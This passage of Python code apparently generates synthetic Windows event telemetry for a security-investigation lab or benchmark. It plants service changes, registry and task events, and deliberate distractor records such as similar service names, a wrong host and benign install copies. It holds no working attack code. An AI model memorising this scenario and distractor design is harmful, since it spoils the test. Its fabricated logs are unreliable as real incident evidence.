                raw_event={"agent":{"id":f"lab-{variant.lower()}","name":event_host},"data":{"win":{"system":{"eventID":"7036","providerName":PUBLIC_PROVIDER[kind],"systemTime":event_time},"eventdata":{"param1":svc,"param2":state.lower()}}}}
            else:
                if svc.casefold()==target.casefold() and case["id"] in {"case-02","case-03","case-final"}:
                    old,new=("Automatic","Disabled")
                else:
                    old,new=rng.choice([("Manual","Automatic"),("Automatic","Disabled"),("Disabled","Manual"),("Manual","Manual")])
                norm={"service":{"name":svc,"old_start_mode":old,"new_start_mode":new},"process":{"name":"services.exe","pid":rng.randrange(300,7000)},"message":f"Service configuration changed for {svc}"}
            obj=f"service:{svc.casefold()}"
        elif kind in {"process_start","process_exit"}:
            norm={"process":{"name":process,"pid":rng.randrange(500,18000),"parent":rng.choice(PROCESSES),"command_line":process},"user":{"name":rng.choice(["LAB\\analyst","NT AUTHORITY\\SYSTEM","LAB\\student"])},"message":f"Process {'created' if kind=='process_start' else 'terminated'}: {process}"}
            obj=f"process:{process.casefold()}"
        elif kind=="registry_value_set":
            key=rng.choice(["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Teams","HKLM\\Software\\Policies\\Microsoft\\Windows Defender"])
            norm={"registry":{"key":key,"value_name":key.split("\\")[-1],"value_data":rng.choice(["OneDrive.exe /background","Teams.exe --startup","(empty)"])},"process":{"name":process,"pid":rng.randrange(500,18000)},"message":"Registry value updated"}; obj=f"registry:{key.casefold()}"
        elif kind=="scheduled_task_action":
            task=rng.choice(["\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan","\\Microsoft\\Office\\OfficeTelemetryAgentLogOn","\\Adobe\\Acrobat Update Task"])
            norm={"task":{"name":task,"action":process},"process":{"name":"taskhostw.exe","pid":rng.randrange(500,18000)},"message":"Scheduled task action completed"}; obj=f"task:{task.casefold()}"
        elif kind=="network_activity":
            norm={"process":{"name":process,"pid":rng.randrange(500,18000)},"source":{"ip":"10.24.8.16","port":rng.randrange(49152,65535)},"destination":{"ip":f"198.51.100.{rng.randrange(1,254)}","port":rng.choice([443,80,53])},"message":"Network connection observed"}; obj=f"process:{process.casefold()}"
        elif kind=="dns_query":
            domain=rng.choice(["login.microsoftonline.com","download.windowsupdate.com","teams.microsoft.com","officecdn.microsoft.com","updates.example.test"])
            norm={"process":{"name":process,"pid":rng.randrange(500,18000)},"dns":{"question":{"name":domain}},"message":f"DNS query for {domain}"}; obj=f"dns:{domain}"
        elif kind=="logon_success":
            user=rng.choice(["LAB\\analyst","LAB\\student","NT AUTHORITY\\SYSTEM"])
            norm={"user":{"name":user},"source":{"ip":"10.24.8.16"},"logon":{"type":2},"message":"An account was successfully logged on"}; obj=f"user:{user.casefold()}"
        else:
            path=rng.choice(["C:\\Users\\Public\\desktop.ini","C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk","C:\\Windows\\Temp\\cab_001.tmp"])
            norm={"file":{"path":path,"operation":"modified"},"process":{"name":process,"pid":rng.randrange(500,18000)},"message":"File activity recorded"}; obj=f"file:{path.casefold()}"
        rows.append(_record(f"{case['id']}-{variant}-{i:05d}",when,event_host,code,kind,PUBLIC_PROVIDER[kind],obj,norm,raw_event))

    def add(suffix,minute,event_code,kind,provider,object_key,norm,raw=None,provenance="generated",host_override=None):
        when=BASE+timedelta(minutes=minute,seconds=17,milliseconds=432)
        actual_host=host_override or host
        if raw is None and event_code=="7040" and kind=="service_modified":
            service=norm.get("service",{})
            start_types={"Manual":"demand start","Automatic":"auto start","Disabled":"disabled"}
            raw={"agent":{"id":f"lab-{variant.lower()}","name":actual_host},"data":{"win":{"system":{"eventID":"7040","providerName":provider,"systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":{"serviceName":service.get("name"),"oldStartType":start_types.get(service.get("old_start_mode"),service.get("old_start_mode")),"newStartType":start_types.get(service.get("new_start_mode"),service.get("new_start_mode"))}}}}
        if raw is None and event_code=="7045" and kind=="service_created":
            service=norm.get("service",{})
            raw={"agent":{"id":f"lab-{variant.lower()}","name":actual_host},"data":{"win":{"system":{"eventID":"7045","providerName":provider,"systemTime":when.isoformat().replace("+00:00","Z")},"eventdata":{"ServiceName":service.get("name"),"ImagePath":service.get("binary_path"),"ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}}}}
        rows.append(_record(special_event_id(case,variant,suffix),when,actual_host,event_code,kind,provider,object_key,norm,raw,provenance))

    # Dense routine service activity leaves same-window, similar-name candidates to inspect.
    for j,similar in enumerate(["WindowsUpdate","GoogleUpdateService","EdgeUpdate","OfficeUpdateTask","AdobeUpdateService",target+"Svc"]):
        old,new=("Manual","Automatic")
        add(f"near-{j}",49+j,"7040","service_modified","Service Control Manager",f"service:{similar.casefold()}",{"service":{"name":similar,"old_start_mode":old,"new_start_mode":new},"process":{"name":"services.exe"},"message":f"Start type changed for {similar}"})
    add("wrong-host",52,"7040","service_modified","Service Control Manager",f"service:{target.casefold()}",{"service":{"name":target,"old_start_mode":"Manual","new_start_mode":"Automatic"},"process":{"name":"services.exe"},"message":"Service start type changed"},raw={"agent":{"id":"lab-other","name":"WIN-OPS-07"},"data":{"win":{"system":{"eventID":"7040","providerName":"Service Control Manager"},"eventdata":{"serviceName":target,"oldStartType":"demand start","newStartType":"auto start"}}}},host_override="WIN-OPS-07")

    if case["id"]=="case-01":
        add("evidence",53,"7045","service_created","Service Control Manager",f"service:{target.casefold()}",{"service":{"name":target,"binary_path":f"C:\\Program Files\\{target}\\agent.exe"},"process":{"name":"services.exe","pid":680},"rule":{"id":"1007045","level":3},"message":f"A service was installed: {target}"})
        # Similar benign service-install records create competing 7045 results after Snapshot B.
        # Give each one its own time and Windows record identity while holding the other fields steady.
        benign_rng=random.Random(case["noise_seed"]+VARIANTS[variant]["seed_offset"]+7045)
        benign_minutes=sorted(benign_rng.sample(range(61,179),5))
        benign_service=target
        benign_path=f"C:\\Program Files\\{target}\\{target}.exe"
        benign_norm={"service":{"name":benign_service,"binary_path":benign_path},"process":{"name":"services.exe","pid":680},"rule":{"id":"1007045","level":3},"message":f"A service was installed: {benign_service}"}
        for copy_index,minute in enumerate(benign_minutes):
            benign_when=BASE+timedelta(minutes=minute,seconds=benign_rng.randrange(60),milliseconds=benign_rng.randrange(1000))
            benign_raw={"agent":{"id":f"lab-{variant.lower()}","name":host},"data":{"win":{"system":{"eventID":"7045","providerName":"Service Control Manager","systemTime":benign_when.isoformat().replace("+00:00","Z"),"eventRecordID":str(18422+copy_index)},"eventdata":{"ServiceName":benign_service,"ImagePath":benign_path,"ServiceType":"user mode service","StartType":"auto start","AccountName":"LocalSystem"}}}}
            rows.append(_record(special_event_id(case,variant,f"benign-install-copy-{copy_index}"),benign_when,host,"7045","service_created","Service Control Manager",f"service:{benign_service}",benign_norm,benign_raw,"synthetic_benign_context"))
    elif case["id"]=="case-02":
        similar=target+"Svc"
        add("same-object-wrong-transition",55,"7040","service_modified","Service Control Manager",f"service:{similar.casefold()}",{"service":{"name":similar,"old_start_mode":"Automatic","new_start_mode":"Disabled"},"process":{"name":"services.exe"},"message":f"Start type changed for similar service {similar}"})
    elif case["id"]=="case-04":
        opposite_at=BASE+timedelta(minutes=39,seconds=27)
        opposite={"service":{"name":target,"old_start_mode":"Automatic","new_start_mode":"Disabled","binary_path":f"C:\\ProgramData\\CsgLab\\Stage\\{target}"},"process":{"name":"services.exe","pid":680},"message":f"Start type changed for {target}: Automatic to Disabled"}
        rows.append(_record(special_event_id(case,variant,"same-service-opposite-direction"),opposite_at,host,"7040","service_modified","Service Control Manager",f"service:{target.casefold()}",opposite,provenance="synthetic_benign_context"))

    if case.get("incident"):
        _,_,transitions=materialize_incident(case,variant)
        by_id={item["id"]:item for item in transitions}
        variables=_incident_variables(case,variant)
        for coverage in case["incident"].get("telemetry",[]):
            if coverage["coverage"]!="recorded":
                continue
            transition=by_id[coverage["transition_id"]]
            rows.append(_transition_event(case,variant,transition,variables))
        rows.extend(_incident_distractors(case,variant,variables))
    rows.extend(malicious_context_events(case,variant))
    if case["id"]=="case-02":
        rows.extend(case2_telemetry_gap_support_events(case,variant))
    for row in rows:
        row["scenario_slug"]=case["slug"]
        row["variant"]=variant
    return rows
